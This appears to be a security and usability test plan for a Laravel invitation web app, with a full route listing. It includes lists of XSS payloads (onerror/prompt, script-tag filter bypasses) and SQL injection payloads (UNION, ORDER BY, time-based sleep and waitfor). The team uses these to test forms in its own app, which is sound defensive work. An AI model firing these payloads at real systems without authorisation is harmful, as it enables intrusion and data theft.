## Intro

There will be two actors involved in two rounds of testing: SimpleUser and ComplexUser, and all testing will be done manually. In general, the tasks will be divided as follows: SimpleUser will be responsible for testing all page size-responsively and all forms with various normal data that will be predetermined by some rule, and ComplexUser will be responsible for testing all forms with various data/Payload XSS and SQLinjection and closely observing the response detail. The testing can be continuously, during the development process until the final phase on April 5-10, 2023. There are some rules to directive the testing process and how to record the testing results, so the testing will be `inflexible`.

The testing with SimpleUser, which attempts to test all forms with various normal data, tends to be more suitable for `black box testing`, where testing is done from the user's point of view or the use of the application without paying attention to internal implementation details. Meanwhile, the testing with ComplexUser, which attempts to test with data/Payload XSS and closely observe the response, tends to be more suitable for `grey box testing`, where testing is done with some knowledge of the design and structure of the application.

## Guideline for SimpleUser

1. Login with Google (Google Auth)

2. Explore the entire page

3. Test the responsiveness of the entire page

4. Test all forms repeatedly

5. Test all forms in various conditions.

## Guideline for ComplexUser

1. Manual Registration and Login

2. Manually test the register form repeatedly for SQLi and XSS vulnerabilities

3. Manually test the login form for SQLi and XSS vulnerabilities

4. Repeatedly test all forms in the CMS

5. Test all forms in various conditions.

## General Rules

1. ComplexUser and SimpleUser are not allowed to exchange information regarding the testing process and results.

2. ComplexUser and SimpleUser are not allowed to be in close proximity to each other while one or both are conducting testing.

3. Testing is conducted manually without the use of automated scripts.

4. If an error occurs during the testing process, testing must continue until it cannot be continued.

5. ComplexUser and SimpleUser must understand the format or guidelines for recording testing results and processes.

## Steps

Note: Not all points/steps may be adopted. Here are the steps in conducting web application testing using the grey-box method:

- Understanding Specification: Reading and understanding the specification and requirements of the tested application.

- Code Analysis: Analyzing the code to understand how the application works and identifying which parts need to be tested.

- Test Case Selection: Selecting test cases to be executed based on code analysis and specifications.

- Test Data Creation: Creating test data to test the application and ensure that everything functions as expected.

- Test Environment Setup: Preparing the test environment by installing the required software and configuring the test environment.

- Running Test Cases: Running test cases using the created test data.

- Recording Results: Recording test case results and identifying any issues found.

- Reporting Results: Reporting test case results to the development team and/or project management for further action.

The grey-box method is a combination of black-box and white-box methods, so in the code analysis stage, it is only done to understand how the application works, not to make changes to the application code.

## Payload XSS

```
"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
';a=prompt,a()//
'-eval("window['pro'%2B'mpt'](8)")-'
"-eval("window['pro'%2B'mpt'](8)")-"
"onclick=prompt(8)>"@x.y
"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
<image/src/onerror=prompt(8)>
<img/src/onerror=prompt(8)>
<image src/onerror=prompt(8)>
<img src/onerror=prompt(8)>
<image src =q onerror=prompt(8)>
<img src =q onerror=prompt(8)>
</scrip</script>t><img src =q onerror=prompt(8)>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
```

## SQLinjection Payload

```
OR 1=1
OR 1=0
OR x=x
OR x=y
OR 1=1#

1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+

1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --

-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --

sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
```

## More Payload at : [PayloadBox Github](https://github.com/payloadbox)

## Example Report Table

| No  | Date   | URI/ Pages        | Input                       | Output          | Exp.                                    |
| --- | ------ | ----------------- | --------------------------- | --------------- | --------------------------------------- |
| 1   | 05 Feb | Add Contacts Form | "));waitfor delay '0:0:5'-- | SQL Error . . . | Lorem ipsum dolor sit amet consectetur. |
| 2   | 05 Feb | Add Contacts Form | "));waitfor delay '0:0:5'-- | SQL Error . . . | Lorem ipsum dolor sit amet consectetur. |
| 3   | 05 Feb | Add Contacts Form | "));waitfor delay '0:0:5'-- | SQL Error . . . | Lorem ipsum dolor sit amet consectetur. |

## All Routes

```
Auth::routes();

Route::get('/', [
      PublicController::class, 'home'
]);

Route::get('/a', [
      InvitationController::class, 'justTesting'
]);

Route::get('/index', [
      PublicController::class, 'home'
]);

// Google Auth
Route::get('/login/google',
      [LoginController::class, 'redirectToGoogle']
)->name('login-with-google');

Route::get('/login/google/callback',
      [LoginController::class, 'handleGoogleCallback']
)->name('callback-google');

Route::get('/home',
      // [App\Http\Controllers\HomeController::class, 'index']
      function () {
            return redirect()
            ->route('dashboard')
            ->with('notify', 'success')
            ->with('message', 'Login. Selamat Datang !');
      }
)->name('home');

Route::get('/how-to-create', function () {
      return request()->route()->uri();
})->name('how_to_create');

// Halaman (Unique URL)
Route::get('/inv/{inv_unique_code}/{contact_unique_code}',
      [InvitationController::class, 'publicInvitation']
)->name('invitation-unique-url');

// Halaman (Unique URL)
Route::get('/inv-gallery/{inv_unique_code}/{contact_unique_code}',
      [InvitationController::class, 'publicGallery']
)->name('gallery-unique-url');

// Halaman (Public URL)
Route::get('/public-inv/{inv_public_code}/',
      [InvitationController::class, 'publicInvitation']
)->name('invitation-public-url');

// Halaman (Public URL)
Route::get('/public-inv-gallery/{inv_public_code}/',
      [InvitationController::class, 'publicGallery']
)->name('gallery-public-url');

Route::middleware('auth')->group(function () {
      // Halaman
      Route::get('/dashboard',
            [DashboardController::class, 'dashboard']
      )->name('dashboard');

      // Halaman
      Route::get('/dashboard/catalogue',
            [DashboardController::class, 'catalogue']
      )->name('catalogue');

      // Halaman
      Route::get('/dashboard/notifications',
            [DashboardController::class, 'notification']
      )->name('notifications');

      // Halaman
      Route::get('/dashboard/contacts',
            [DashboardController::class, 'contacts']
      )->name('contacts');

      // Proses
      Route::post('/dashboard/contacts/create-new-contacts',
            [ContactController::class, 'create']
      )->name('create-contacts');

      // Proses
      Route::get('/dashboard/contacts/download-all-contacts',
            [ContactController::class, 'downloadContact']
      )->name('download-all-contacts');

      // Proses
      Route::get('/dashboard/contacts/delete-contacts/{contact_id}',
            [ContactController::class, 'delete']
      )->name('delete-contacts');

      // Proses
      Route::post('/dashboard/contacts/update-contacts/{contact_id}',
            [ContactController::class, 'update']
      )->name('update-contacts');

      // Halaman
      Route::get('/dashboard/gallery',
            [DashboardController::class, 'gallery']
      )->name('gallery');

      // Proses
      Route::post('/dashboard/gallery/upload-photos',
            [PhotoController::class, 'store']
      )->name('upload-photos');

      // Proses
      Route::get('/dashboard/gallery/delete-photo/{photo_id}',
            [PhotoController::class, 'delete']
      )->name('delete-photo');

      // Halaman
      Route::get('/dashboard/invitations',
            [DashboardController::class, 'invitations']
      )->name('invitations');

      // Halaman
      Route::get('/dashboard/invitations/{inv_id}',
            [InvitationController::class, 'invitationDetail']
      )->name('update-invitation-page');

      // Halaman
      Route::get('/dashboard/view-theme/{id}',
            [InvitationController::class, 'viewTheme']
      )->name('view-theme');

      // Proses
      Route::post('/dashboard/invitations-save/{inv_id}',
            [InvitationController::class, 'update']
      )->name('save-invitation-data');

      // Halaman->Proses
      Route::get('/dashboard/payment/{package_id}',
            [DashboardController::class, 'payment']
      )->name('payment');

      // Proses
      Route::post('/dashboard/buy-package/{package_id}',
            [PurchaseHistoryController::class, 'buyPackage']
      )->name('buy-package');

      // Halaman
      Route::get('/dashboard/profile',
            [DashboardController::class, 'profile']
      )->name('profile');

      // Proses
      Route::post('/dashboard/profile/update-profile-data',
            [ProfileController::class, 'updateProfile']
      )->name('update-profile');
});
```
